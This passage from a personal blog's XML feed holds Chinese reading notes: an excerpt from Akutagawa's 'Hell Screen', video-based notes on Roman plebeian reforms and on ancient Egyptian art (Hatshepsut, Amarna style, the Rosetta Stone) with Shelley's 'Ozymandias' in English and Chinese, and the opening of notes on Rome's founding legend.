<h4 id="地狱变"><a class="header-anchor" href="#地狱变">¶</a>地狱变</h4>
<p>这是因为，良秀笔下的众多罪人，上至三公九卿下至乞丐贱民，网罗了各色人等。有峨冠博带的庙堂高官，有花枝招展的年轻宫女，有颈挂麻纸的诵经僧，有高底木屐的书童，有长裙飘飘的豆蔻侍女，有手持供钱的阴阳先生，无暇一一列举。总之，如此形形色色的诸多男女，无不惨遭牛头马面的摧残，在上下翻腾的浓烟烈火中如风吹败叶般四下狼狈逃窜。</p>
<p>那被烟呛得白惨惨的面庞，那随火乱舞的长飘飘的秀发，那转瞬化为火焰的美艳艳的樱花盛装——所有这些是何等惨不忍睹啊！尤其每当夜风向下盘旋而烟随风披靡之时，金星乱坠的红通通的火焰中便闪现出少女咬着堵嘴物而始终拼命挣脱锁链时那痛苦扭动的情形，令人觉得地狱的大苦大难活生生展现于眼前。</p>
<p>刚才还在为地狱的惨烈场面惊恐困惑的良秀，此刻那满是皱纹的脸上浮现出无可名状的光辉——一种近乎恍惚状态的由衷喜悦之情。</p>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>外国文学</category>
        <category>日本文学</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>外国文学</tag>
        <tag>日本文学</tag>
      </tags>
  </entry>
  <entry>
    <title>【从城邦到帝国】3_平民改革_立法图强</title>
    <url>/2024/07/13/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%E3%80%90%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%E3%80%913_%E5%B9%B3%E6%B0%91%E6%94%B9%E9%9D%A9_%E7%AB%8B%E6%B3%95%E5%9B%BE%E5%BC%BA/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>  是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
<h3 id="平民改革-立法图强"><a class="header-anchor" href="#平民改革-立法图强">¶</a>平民改革 立法图强</h3>
<h4 id="背景"><a class="header-anchor" href="#背景">¶</a>背景</h4>
<ul>
<li>
<p><strong>罗马人</strong>通过三次维爱战争，击败了埃特鲁里亚人，迈出了对外征服的第一步。但是好景步长，北方强大的<strong>高卢人</strong>南下，打败罗马军队，罗马城也被洗劫一空。自此之后，高卢人的凶猛给罗马人造成了心理阴影。而罗马经过此次大劫，损失惨重，元气大伤，但她并没有喘息之机。</p>
</li>
<li>
<p>此前臣服于罗马的<strong>沃尔西人</strong>、<strong>厄奎人</strong>和部分埃特鲁里亚城邦趁虚反叛，而与之交好的拉丁同盟和赫尔尼西人也背弃盟约。</p>
</li>
<li>
<p>经过40余年的斗争，罗马解决了自高卢之患后反叛者与近邻的矛盾，稳固了在亚平宁半岛中北部的统治地位。</p>
</li>
<li>
<p>这一段时期的罗马，除了应付外患，还要解决内部激烈的平民与贵族斗争（前494-前287）。并且，其内忧与外患相互影响。</p>
</li>
<li>
<p><u>罗马的<em>共和制</em>是一种<em>贵族执政</em>的共和，其贵族源自氏族时期的显赫世家</u>。</p>
<ul>
<li>
<p>早在罗穆路斯时代，就有所谓的“100名贤能者”处理国是。</p>
</li>
<li>
<p>后来，<strong>萨宾人</strong>的合并加了100，老塔克文上台又加了100，这些人组成了元老院，被人尊称为“元老”。</p>
</li>
<li>
<p>元老们的家族和后代就成为了罗马的早期贵族，而与贵族相对应的是广大平民。</p>
</li>
<li>
<p>平民的来源比较复杂，主要是罗马本地平民、零散迁居的外乡人和被征服的拉丁部落等。</p>
</li>
</ul>
</li>
<li>
<p><u>平民与贵族的社会地位十分不平等</u>。</p>
<ul>
<li>
<p>共和早期，政府的公职、神职和元老都是清一色的贵族出身。</p>
</li>
<li>
<p>贵族世家的长期垄断，进而形成了上层社会的小圈子。比如法比乌斯、克劳狄乌斯、埃米利乌斯、科尔涅利乌斯都是当时的显赫世家。</p>
</li>
<li>
<p>并且，贵族在政治、司法、宗教和分配上享有特殊权力。</p>
</li>
<li>
<p>虽然在王政时代，经过塞尔维乌斯改革，贵族权力遭到削弱，但也仅仅只是有所削弱。</p>
</li>
</ul>
</li>
<li>
<p><u>另外，平民也是分三六九等的</u>。</p>
<ul>
<li>
<p>比如那些靠经营工商业而发家致富的平民，在积累了一定的财富后，不甘心被罗马的旧贵族排挤在政治生活之外，也想寻求更高的政治权力和社会地位。</p>
</li>
<li>
<p>此外，随着对外扩张，罗马的土地总量确实越来越多。</p>
</li>
<li>
<p>但是由于贵族的特权占有，平民依然是无地少地。</p>
</li>
<li>
<p>加上连年征战，农民频繁服兵役，致使土地荒废，粮食歉收。越来越多的农民经济得不到保障而负债累累，甚至沦为债务奴隶，遭到债权人的任意荼毒、盘剥。</p>
</li>
<li>
<p>那时候的罗马平民无论高低贵贱，都是处在被压迫和被排挤的社会环境中的。</p>
</li>
<li>
<p>所以平民为了切身利益，就不得不联合起来与贵族进行斗争。</p>
</li>
</ul>
</li>
</ul>
<h4 id="第一次"><a class="header-anchor" href="#第一次">¶</a>第一次</h4>
<ul>
<li>
<p><u>罗马的平贵斗争没有通过暴力革命，而是以一种特别的方式</u>。</p>
<ul>
<li>
<p>公元前494年，罗马对外征战，急需兵源，但是国内的农民却不愿服兵役。</p>
</li>
<li>
<p>于是执政官下令释放因债务纠纷而入狱的犯人，并承诺去前线参战就可以既往不咎。于是，农民和犯人都积极参军、奋勇杀敌。</p>
</li>
<li>
<p>可是，当这些人都脱去戎装，返回罗马时，迎接他们的不是荣耀与欢呼，而是屈辱的牢狱和枷锁。</p>
</li>
<li>
<p>这种言而无信的行为，激起民众的不满。平民要求变法，却又遭到元老院的一致反对。</p>
</li>
<li>
<p>于是平民百姓忍无可忍，集体离开罗马城，撤往不远处的山头上，扬言要另建一座新城。</p>
</li>
<li>
<p>失去了人口，等于失去了一切，这对几乎连年征战的罗马是致命的打击。那些贵族只好与平民谈判，接受平民的请愿。<u>平民<strong>保民官</strong>就这样应运而生</u>（人数从2-5-10）</p>
</li>
</ul>
</li>
</ul>
<h4 id="保民官"><a class="header-anchor" href="#保民官">¶</a>保民官</h4>
<ul>
<li>
<p><strong>保民官</strong>作为平民的代表，有权向元老院提出申诉和抗议，比如阻止官员滥用职权，否决对平民不利的立法。</p>
<ul>
<li>
<p>并且，保民官的人身安全神圣不可侵犯。</p>
</li>
<li>
<p>自此之后，<u>平民与贵族的矛盾就表现为保民官与贵族之间的斗争</u>。</p>
</li>
<li>
<p>公元前471年，平民保民官<strong>沃来罗·帕波利乌斯</strong>（Volero Publilius）又争取到保民官只能由平民选举的权力，避免了贵族的干涉。</p>
</li>
<li>
<p>但是，罗马平贵斗争远远没有结束。像罗马平民这种不合作的革命方式未来还要上演四次。</p>
</li>
</ul>
</li>
<li>
<p>和很多文明一样，那时候的罗马没有<em>成文法</em>，很多判决都是依靠人治和习惯法，致使平民权力常常得不到保障。</p>
<ul>
<li>
<p>公元前462年，保民官<strong>特伦里乌斯·哈尔萨</strong>（Terentilius Harsa）最早提出了编纂成文法的要求。</p>
</li>
<li>
<p>但是，直到公元前451年，才由贵族组成了一个10人立法委员会去编纂法律。</p>
</li>
<li>
<p>这10人研究了一年，弄了10张表，但是没编完；第二年，又换了5个贵族和5个平民接盘，终于搞了12张表；</p>
</li>
<li>
<p>加上后续的一些补充，就形成了著名的**《十二铜表法》**。</p>
</li>
</ul>
</li>
</ul>
<h4 id="《十二铜表法》"><a class="header-anchor" href="#《十二铜表法》">¶</a>《十二铜表法》</h4>
<ul>
<li>
<p>**《十二铜表法》**是罗马对以往习惯法的汇编，包括诉讼、债务、宗法、监护、遗产、契约、贸易、土地、伤害、宗教、婚姻等方面。</p>
<ul>
<li>
<p>虽然这个法律是明确维护贵族的既得利益，但是也从一定程度上限制了贵族权力，使其不能像过去那样肆意解释法律。</p>
</li>
<li>
<p>从这一点看，这依然是<u>平贵斗争中属于平民的一次重大胜利</u>。</p>
</li>
<li>
<p>让罗马人引以为傲的《十二铜表法》在历史上从未被废除，有些条款一直延续到罗马后期。该法律的语言也成为后世法典的语言典范</p>
</li>
<li>
<p>十二铜表法被认为是现今欧陆法系中“罗马法”的源头之一。</p>
</li>
</ul>
</li>
<li>
<p>公元前444年到公元前367年，可能是出于军事需要，也可能是平贵斗争的结果，这近80年之间，罗马只有22年选了执政官，剩下的时间全部由军政官代替。因为这种官职平民也可以担任。</p>
<ul>
<li>
<p>后来又出现了监察官、财务官等职位，均对平民开放。</p>
</li>
<li>
<p><u>贵族对国家公职的垄断从此有所改变</u>。</p>
</li>
</ul>
</li>
</ul>
<h4 id="持续"><a class="header-anchor" href="#持续">¶</a>持续</h4>
<ul>
<li>
<p>高卢战争后，罗马城遭到严重破坏，城市被焚，土地荒芜，不少小农直接破产，沦为佃户。</p>
<ul>
<li>
<p>而贵族为了转嫁损失，就对底层平民进行更重的盘剥和压迫。</p>
</li>
<li>
<p>这就导致土地、债务和政治平权等问题再次以平贵斗争的形势提上日程。</p>
</li>
</ul>
</li>
<li>
<p>公元前367年，通过李锡尼-绥克斯图法案，减免债务利息，并且平民可当选执政官。</p>
<ul>
<li>
<p>公元前356年，平民也可以担任独裁官和监察官。</p>
</li>
<li>
<p>公元前342年，通过盖努西乌斯法案，两个执政官均可由平民担任。</p>
</li>
<li>
<p>公元前326年，通过波提利乌斯法案，废除债务奴隶制。</p>
</li>
<li>
<p>公元前300年，通过古尔尼乌斯兄弟法案，平民也可以担任一直由贵族垄断的宗教职务。</p>
</li>
<li>
<p>至此，<u>罗马的平贵之间在担任国家公职方面几乎没有区别</u>。</p>
</li>
</ul>
</li>
<li>
<p>公元前287年，罗马爆发第五次<em>平民撤离运动</em>，迫使独裁官承认，平民的决定对全体公民具有法律效力。</p>
<ul>
<li>这件事，<u>标志着罗马的平贵斗争彻底结束</u>。</li>
</ul>
</li>
<li>
<p>会想到公元前494年，发生第一次撤离运动时，彼时的罗马还是一个矛盾激化、几乎分裂的国家；经过两百多年的平民与贵族斗争，到公元前287年的最后一次撤离运动结束时，<u>罗马共和国成功转型</u>，成为一个团结的国家。</p>
<ul>
<li>
<p>旧氏族显贵逐渐衰落，平民的上层成为国家新贵掌握权力，组成新的统治集团；</p>
</li>
<li>
<p>平民的中下层地位也有所改善：土地分配，债务减免，缓和了土地兼并，使罗马的小农生计得以维持。</p>
</li>
<li>
<p>农民有了土地，对外征服的人力资源就有了保障。</p>
</li>
</ul>
</li>
<li>
<p>此外，在斗争中，罗马共和国的国家制度也逐渐完善，设立了更多有针对性的官职，以处理日益复杂的国家事务。</p>
</li>
<li>
<p>在罗马的政治体制中，元老院依然是权力中枢，是最重要的国家机关。</p>
</li>
<li>
<p><em>非暴力不合作运动</em>也是解决社会矛盾的一种方式，而那时的罗马恰好有一群和平理性的抗争者，也有一群比较理性、能够自我克制的被抗争者，才能使罗马在如此低的成本之下，完成社会的进步与发展</p>
</li>
</ul>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<ul>
<li>很有启发意义的一话</li>
</ul>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>世界史</category>
        <category>罗马史</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>罗马史</tag>
      </tags>
  </entry>
  <entry>
    <title>【艺术史】来世与王权的艺术——古埃及艺术</title>
    <url>/2024/07/04/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E5%9F%83%E5%8F%8A%E5%8F%B2/%E3%80%90%E8%89%BA%E6%9C%AF%E5%8F%B2%E3%80%91%E6%9D%A5%E4%B8%96%E4%B8%8E%E7%8E%8B%E6%9D%83%E7%9A%84%E8%89%BA%E6%9C%AF%E2%80%94%E2%80%94%E5%8F%A4%E5%9F%83%E5%8F%8A%E8%89%BA%E6%9C%AF/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1Dg411t7nz/?spm_id_from=333.999.0.0">视频的地址</a>  是偶然发现的一个up主，自分作为埃及历史文化爱好者=不能错过！</p>
<p>当时所有的自行记录都在幕布，所以整理起来发现都是一些凌乱的句子集（捂脸） 后面有心思了可能会完善吧！（？</p>
<p>而且是视频看了一半才想起来记录的，所以这个markdown只有后面一半部分！前半部分有机会补上吧！（？</p>
<h3 id="摘录始于此"><a class="header-anchor" href="#摘录始于此">¶</a>摘录始于此</h3>
<p>艺术是一面镜子，我们能够从中看到的东西取决于我们的知识储备和受教育水平。</p>
<p>古王国时期是艺术发展的黄金时代，这一时期的艺术风格恢弘、稳重、自信，大多数的艺术形式和艺术程式已经确定下来，形成了传统。</p>
<p>五个世纪以来，王权制度慢慢侵蚀了埃及的经济活力，使其再也无法支撑一个庞大的中央集权政府。</p>
<p>（在第一中间期）尽管从在着各种困难，但由于总督们摆脱了法老获得了独立，各个地方的艺术创造力得到了激发，古埃及进入了一个文化多元发展的时期。</p>
<p>总的来说，中王国时期的艺术在细部上有所创新，但在大体上还是遵循了古王国时期的传统。</p>
<p>不论是对于一个王朝也好，还是对于一个个人也好，对于其成长和发展来说必不可少的一件事就是回溯历史。</p>
<p>法老是一位女性，这对于埃及传统来说是一次巨大的挑战，但这件事却并非是无源之水，无本之木，而是有其现实基础的。</p>
<p>有一个普遍规律，就是女性能够成为统治者的前提，是这一时期该地区对于女性的地位是有普遍认知的，并且女性的权益是可以得到保障的。</p>
<p>而根据古埃及的法律，社会成员所拥有的权利取决于他所处的社会地位而非性别。</p>
<p>在古代的社会当中，古埃及的妇女地位相对较高。女性在几乎所有领域都与男性平等，她们享有拥有、继承和遗嘱自己财产的权利。</p>
<p>而“法老”是埃及统治者的称呼，它无关性别。</p>
<p>即使如此，一位女性成为法老还是很罕见的，她必然面临着来自传统的压力和质疑，而这必然会对她的执政合法性构成挑战。</p>
<h4 id="哈特谢普苏特"><a class="header-anchor" href="#哈特谢普苏特">¶</a>哈特谢普苏特</h4>
<p>她在自己的女性身份和传统之间找到了一个平衡点。而在这个过程当中，艺术起到了关键的作用。</p>
<h5 id="哈特谢普苏特的“三板斧”"><a class="header-anchor" href="#哈特谢普苏特的“三板斧”">¶</a>哈特谢普苏特的“三板斧”</h5>
<p>首先是在对外政策方面，在她掌权期间埃及停止了对外战争，转而大力发展和邻国之间的贸易往来，这使得国内的经济迅速繁荣，财富迅速增长；然后是在宗教方面，她宣称自己是阿蒙神之女，这样她的统治就不需要经由和图特摩斯二世的婚姻，而是完全来自于宗教；最后，她通过在埃及大规模的兴建纪念性建筑和雕像来对民众施加影响力，其目的是在于塑造自己的形象，推广自己的成就。</p>
<p>这些建筑和雕像可以迫使民众习惯于看到一个女性统治者的形象，并且接受相应的宗教叙事。这样可以确保当她（哈特谢普苏特）宣称自己为法老的时候，埃及社会不会产生太大的震动。</p>
<p>埃及艺术程式“概念性”的特点再次体现了出来：表现法老的艺术程式不是为了塑造某个具体的人，而是塑造一个概念化的形象，一个符合传统要求的形象。这里也能看出埃及人对于传统的重视。</p>
<p>埃赫那顿的统治不仅见证了一个新首都的建立和一个新宗教的兴起，它也导致了这一时期传统艺术程式的彻底改变，产生了一种新的“阿玛纳风格”（阿玛纳艺术）。</p>
<p>阿玛纳风格自然、生动、充满个性，这是古埃及艺术史上一次出现比较大的风格变化，可能也是唯一的一次。</p>
<p>后世对于这种风格的评价呈现出两极分化的趋势。</p>
<p>这种新的艺术风格就如同他的宗教改革一样极具争议。</p>
<h5 id="视频作者的一些观点"><a class="header-anchor" href="#视频作者的一些观点">¶</a>视频作者的一些观点</h5>
<p>我认为这场宗教改革改变了埃及文化的核心价值，这个特别的法老形象（指埃赫那顿）和阿玛纳风格所反映出的正是这一时期埃及的主流价值。</p>
<p>前面提到，埃及传统文化的核心价值是玛亚特。在这种价值之下，传统的艺术程式所强调的事永恒与秩序，永恒与秩序在法老雕像上面体现出的就是一种“阳刚之美”，甚至很多女性雕像也体现出了男性的特质。</p>
<p>而宗教改革所造成的结果就是传统价值——玛亚特缺失了，或者至少可以说是玛亚特被削弱了。</p>
<p>这种价值的改变可能就造成了埃及人不再追求来世的永恒，而是转而追求现世的美好。</p>
<p>于是，自然、生动、世俗、柔软、充满个性的新艺术风格随之出现，而这种新的艺术风格在法老雕像上面所呈现出的就是女性化的“阴柔之美”。</p>
<p>究其原因，这是由于宗教改革改变了文化的核心价值。</p>
<p>在埃及社会，宗教要比政治重要得多；相比于政治，宗教对艺术产生的影响也要深刻得多。</p>
<p>可能可以佐证这一观点的事实：这一时期所留存下来的墓葬浮雕当中不再有关于来世和死亡的描写。</p>
<p>主流学术界和艺术通史书籍对于埃赫那顿巨像的评价普遍偏负面，他们认为这个雕像是难看的，是不讨人喜欢的。</p>
<p>而他们对于阿玛纳风格的态度则褒贬不一，原因在于阿玛纳艺术自然、轻松的风格在古埃及程式化的艺术当中独树一帜，让人印象深刻。</p>
<p>奈菲尔提提半身像在德国辗转的这85年也是德国风云变幻的85年。</p>
<p>对于德国来说，这件作品的意义早已经超越了艺术范畴，它已经和德国的民族认同和柏林文化联系在了一起。</p>
<p>到这里也就不难理解为什么德国当局对于这件作品的态度如此坚决。</p>
<p>在古埃及艺术充满“象征性”和“正确性”的大环境当中，阿玛纳风格对于具体的人的关怀是很罕见的。</p>
<p>以上小结：阿玛纳时期的艺术相较于传统艺术咋风格上有较大的差异，其原因可能在于埃赫那顿的宗教改革造成了文化核心价值的改变。</p>
<h4 id="阿玛纳风格"><a class="header-anchor" href="#阿玛纳风格">¶</a>阿玛纳风格</h4>
<p>相比之前“静态”的传统风格，阿玛纳风格是“动态的”，其特点是放松、自然、充满“运动感”和“活动感”。</p>
<p>浮雕的主要表现方式为柔和的曲线而非僵硬的直线，所表现的神只有阿顿，没有其他的神。也没有关于死亡和来世的描写。</p>
<p>神庙通常是露天的，没有顶部</p>
<p>人物特征为细长的头部，摇摆的姿态，修长的四肢和突出的肚子。</p>
<p>在构图上相较于传统对于“秩序”的强调，阿玛纳风格显得较为“混乱”。</p>
<p>相较于传统雕像所体现出的“永恒感”和“力量感”（肌肉感），阿玛纳风格的雕像缺乏力量感，而且具有明显的女性化特征，体现出的是一种“阴柔美”。</p>
<p>相较于传统艺术程式对人物所进行的“概念化”描绘，阿玛纳风格侧重于对人物进行“个性化”的表现。</p>
<p>通过对比可以发现，哈特谢普苏特时期的艺术变革是发生在表层的，而阿玛纳时期的艺术变革是发生在深层的。</p>
<p>相比于政治，宗教对艺术的影响要深刻得多。</p>
<h5 id="视频作者的理解"><a class="header-anchor" href="#视频作者的理解">¶</a>视频作者的理解</h5>
<p>世界是一个全面的、联系的、发展的整体，历史是求变的，不论是埃及传统还是艺术程式，它发展到一定程度必然会发生一次突变。</p>
<h4 id="埃赫那顿-宗教改革"><a class="header-anchor" href="#埃赫那顿-宗教改革">¶</a>埃赫那顿&amp;宗教改革</h4>
<p>埃赫那顿和他的宗教改革就是埃及这个文化系统当中的一次突变。</p>
<p>而这次突变会给这个系统注入新的元素，让它继续发展。在后面的作品当中我们仍然能够看到一些阿玛纳风格的影子</p>
<p>在古埃及的陵墓当中，真正的诅咒其实非常罕见，这些“诅咒”通常和墓葬文书当中的咒语相混淆。</p>
<p>然而这些“诅咒”的确有科学上可以解释的原因，例如细菌或者辐射；</p>
<p>后来这些说法和历史结合在了一起，再加上能够让人信服的证据就构成了故事的传播基础，而这些故事后来又随着纪录片和相关的书籍广为流传</p>
<p>但近些年来“法老的诅咒”更多的是作为一种文化元素存在，为各种电影和游戏提供灵感和素材</p>
<p>祭司和抄写员会将来世之旅的过程记录在一个莎草纸卷轴上，然后将这些卷轴和死者一同下葬，这样他们就不会在冥界迷路了。</p>
<p>后来，学者们就将这种图文并茂的古埃及卷轴称为“亡灵书”。</p>
<p>人在第一次死亡之后灵魂会进入冥界，但每个灵魂通过冥界的方式各有不同，方式的选择取决于他们的地位。</p>
<p>通往来世的道路十分艰难，路上会有可怕的生物阻拦灵魂的前行。这时就需要灵魂吟唱亡灵书当中适当的咒语来安抚他们。</p>
<p>当灵魂经历重重险阻穿越冥界之后，他们会到达玛亚特大厅。这里是来世旅程当中最重要的部分，灵魂要在这里接受审判。</p>
<p>每个人的结局都各有不同，而灵魂的纯洁性将是他们能否被允许进入奥西里斯天国的决定性因素。</p>
<p>来世信仰，或者说古埃及文明就是一场永恒的“接力赛”。埃及人将人的死亡与重生和太阳的升起与落下联系在一起，生者的世界和亡者的世界是一个联系的整体，它们都是玛亚特这个更广泛秩序的一部分。</p>
<p>“如果没有来世信仰，埃及社会将失去凝聚力”。从这个角度来说，我们可以将古埃及文明称为“来世的文明”。</p>
<p>古埃及人所渴望的永恒就蕴藏在自己的生活当中，透过“轮回、秩序与永恒”这些在艺术作品当中反复出现的主题，所体现出的其实是埃及人对于生命的渴望和对于死亡的敬畏。</p>
<p>用佛教的话来说，人生是一场修行。</p>
<p>以上小结：亡灵书的形式感很重，它所体现出的是传统的秩序感和永恒感。</p>
<p>除了实用性和故事性，亡灵书也是埃及少见的具有明确道德内容的作品。</p>
<p>亡灵书当中的每一个“我没有…”都蕴含着一个“你不应该”的潜在含义。</p>
<p>拉美西斯二世既满足了人们对于一个曾经存在过的、无限辉煌的文明的想象，同时他也满足了人们对于一个拥有不世功绩，却又自命不凡的帝王的想象。</p>
<p>宗教、语言和文字是一个文明的重要载体，其重要性不言而喻。而随着宗教的衰落，虽然当地的居民仍然说着他们的语言，但随着神庙作用的降低和掌握着文字的祭司的减少，人们阅读和书写象形文字的能力慢慢也就消失了。</p>
<h4 id="罗塞塔石碑与现代埃及学"><a class="header-anchor" href="#罗塞塔石碑与现代埃及学">¶</a>罗塞塔石碑与现代埃及学</h4>
<p>石碑上刻有三种文字，上面的为埃及的正式书写文字，象形文字，也被称为“圣书体”；中间是另一种古埃及文字，被称为“世俗体”；而最下方则是古希腊文字。</p>
<p>欧洲的学者对于古希腊文字相对熟悉，如果他们可以将三种文字对应起来的话应该就能破译象形文字。</p>
<p>石碑的破译工作以古希腊文字为起点，很多学者都参与了进来。</p>
<p>英国的学者托马斯·杨为破译象形文字做出了重要贡献，不过他更为著名的是建立了光的波动理论和进行了杨氏双缝干涉实验。</p>
<p>最后，成功破译象形文字的是法国学者商博良，而他也因此成为了埃及学的奠基人。</p>
<p>罗塞塔石碑的破译成为了现代埃及学的开端，自此人们终于找到了打开古埃及文明这座宝库的钥匙，让我们有机会了解这个辉煌的古老文明</p>
<h4 id="雪莱《奥兹曼迪亚斯》（拉美西斯二世）"><a class="header-anchor" href="#雪莱《奥兹曼迪亚斯》（拉美西斯二世）">¶</a>雪莱《奥兹曼迪亚斯》（拉美西斯二世）</h4>
<p>讽刺诗歌《Ozymandias/奥兹曼迪亚斯》中英文对照[波西·比希.雪莱]</p>
<p>Ozymandias（奥兹曼迪亚斯）被古代希腊称作埃及的Ramses II是一位威武的法老（国王），英国诗人雪莱有写了一首关于他的傲慢与灭亡来暗喻警示当时当权者的傲慢的诗。</p>
<p>诗歌是文学艺术最为凝练的表现形式。波西·比希.雪莱（Percy.Bysshe.Shelley）是19世纪英国<a href="http://www.timeface.cn/aiqing/lmqs">浪漫主义伟大诗人</a>的代表之一，其诗风古朴自然，极富韵律，而内容上也是极富个性，既有对自己情感的强烈表达，又有对大自然的欣赏和热爱，同时还有对封建权威、强权统治的反抗。雪莱笔下的“奥兹曼迪亚斯”（Ozymandias）就是这样一首承载了诗人对权威、传统的反抗的传世之作。对这首诗的诗歌主题进行分析研究的大有人在，然而，诗歌不仅是表意最凝练的方式，它更多地是一种文字艺术，因而，其形式本身也是一种艺术。本题拟将从表词达意（meaning）、意象（imagery）以及修辞手法（figure of speech）对“奥兹曼迪亚斯”进行梳理分析。</p>
<ul>
<li>
<p>《奥兹曼迪亚斯》中英文对照</p>
</li>
<li>
<p>英文原文</p>
</li>
<li>
<p>Ozymandias</p>
</li>
<li>
<p>I met a traveller from an antique land</p>
</li>
<li>
<p>Who said: &quot;Two vast and trunkless legs of stone</p>
</li>
<li>
<p>Stand in the desert. Near them on the sand,</p>
</li>
<li>
<p>Half sunk, a shattered visage lies, whose frown</p>
</li>
<li>
<p>And wrinkled lip and sneer of cold command</p>
</li>
<li>
<p>Tell that its sculptor well those passions read</p>
</li>
<li>
<p>Which yet survive, stamped on these lifeless things,</p>
</li>
<li>
<p>The hand that mocked them and the heart that fed.</p>
</li>
<li>
<p>And on the pedestal these words appear:</p>
</li>
<li>
<p>'My name is Ozymandias, King of Kings:</p>
</li>
<li>
<p>Look on my works, ye mighty, and despair!’</p>
</li>
<li>
<p>Nothing beside remains. Round the decay</p>
</li>
<li>
<p>Of that colossal wreck, boundless and bare,</p>
</li>
<li>
<p>The lone and level sands stretch far away.</p>
</li>
<li>
<p>中文翻译　　1. 奥兹曼迪亚斯（杨绛 译）</p>
</li>
<li>
<p>我遇见一位来自古国的旅人</p>
</li>
<li>
<p>他说：有两条巨大的石腿</p>
</li>
<li>
<p>半掩于沙漠之间</p>
</li>
<li>
<p>近旁的沙土中，有一张破碎的石脸</p>
</li>
<li>
<p>抿着嘴，蹙着眉，面孔依旧威严</p>
</li>
<li>
<p>想那雕刻者，必定深谙其人情感</p>
</li>
<li>
<p>那神态还留在石头上</p>
</li>
<li>
<p>而斯人已逝，化作尘烟</p>
</li>
<li>
<p>看那石座上刻着字句：</p>
</li>
<li>
<p>“我是万王之王,奥兹曼斯迪亚斯</p>
</li>
<li>
<p>功业盖物,强者折服”</p>
</li>
<li>
<p>此外，荡然无物</p>
</li>
<li>
<p>废墟四周，唯余黄沙莽莽</p>
</li>
<li>
<p>寂寞荒凉，伸展四方。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>世界史</category>
        <category>埃及史</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>埃及史</tag>
      </tags>
  </entry>
  <entry>
    <title>【从城邦到帝国】1_罗马起源_王政时代</title>
    <url>/2024/07/06/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%E3%80%90%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%E3%80%91-1-%E7%BD%97%E9%A9%AC%E8%B5%B7%E6%BA%90-%E7%8E%8B%E6%94%BF%E6%97%B6%E4%BB%A3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>   是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
<h3 id="罗马起源-王政时代"><a class="header-anchor" href="#罗马起源-王政时代">¶</a>罗马起源 王政时代</h3>
<p>​	<em>亚平宁半岛</em>是罗马的起源之地，早在旧石器时代这里就有人类活动的迹象。随着人类族群的迁徙，居民成分也日趋复杂.</p>
<p>​	到公元前8世纪时，这里生活着自石器时代以来就住在这儿的原住民，比如利古里亚人、撒丁人；青铜时代前后来到这儿的印欧语系部落，比如翁布里亚人、萨宾人、拉丁人，还有一些来自小亚细亚的埃特鲁里亚人，以及从爱琴海那边来殖民的希腊人，最后是从阿尔卑斯翻山越岭而来的高卢人。而罗马的先民们，只是众多上古意大利居民中的一支，拉丁族的一个小部分。</p>
<p>​	公元前九到八世纪，一些部落迁移到帕拉丁、厄斯魁林、奎里纳尔等七个山丘定居，进而形成了数个村落。后来，几个村落逐渐联合起来，称七丘联盟。其中生活在帕拉丁山罗马村的拉丁人，成了这个联盟的核心，这就是早期的罗马王国。</p>
<p>​	关于罗马城的建立，其实还有一个传说：</p>
<p>​		<strong>努米托尔</strong>和<strong>阿穆利乌斯</strong>兄弟俩是特洛伊城的王子埃涅阿斯的后代，努米托尔是阿尔巴朗格的国王，阿穆利乌斯掌管国家宝库。但是，阿穆利乌斯不满现有的权力，于是他篡夺了努米托尔的王位。</p>
<p>​		为了防止努米托尔的后代报复，阿穆利乌斯就强迫努米托尔唯一的女儿雷亚·<strong>西尔维娅</strong>去做维斯塔贞女，因为贞女是不能结婚的。但是，西尔维娅与战神马尔斯相遇后，坠入爱河，生了两个孩子，分别叫<strong>罗穆路斯</strong>和<strong>雷穆斯</strong>。</p>
<p>​		阿穆利乌斯知道此事后十分恼怒，便把西尔维娅给活埋了，她的两个孩子也被扔到了野外。幸运的是，两个弃婴经过一头母狼的乳汁哺育而活了下来。后来，一个叫浮士德的牧羊人发现了兄弟俩并带回家抚养。</p>
<p>​		长大后，他们向阿穆利乌斯复仇，最终帮助努米托尔夺回王位，而城中的难民、流浪者和奴隶被兄弟俩带走，其中大多数人是男性。</p>
<p>​		他们决定一起在别处另建一座新城，但是兄弟俩因为城市选址的问题发生了争执，罗穆路斯便杀死了雷穆斯，并以自己的名字，给这座新城取名为罗马，而<u>罗穆路斯就成成为罗马的第一位王</u>。</p>
<p>​	这一年，是公元前753年。以此为起点，罗马进入王政时代。</p>
